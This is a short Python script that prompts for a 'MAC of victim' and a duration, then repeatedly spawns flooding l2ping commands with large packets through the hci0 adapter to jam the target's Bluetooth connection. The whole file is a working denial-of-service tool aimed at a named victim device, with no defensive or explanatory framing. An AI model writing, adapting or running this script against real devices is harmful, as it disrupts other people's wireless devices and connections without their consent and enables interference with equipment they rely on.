import os
import subprocess
import time
import colorama
from colorama import Fore, Back, Style
import headers
import random
colorama.init(autoreset=True)
def start():
    headers.header()
start()

mac = input("MAC of victim: ")
time = input("Time of jamming: ")
print("Start jamming...")
delay = int(time)

while delay != 0:
    for i in range(3):
        xterm_1 = "timeout 1s l2ping -i hci0 -s 800 -f %s &" % (mac)
        subprocess.Popen(xterm_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE,shell=True)

    delay -= 1
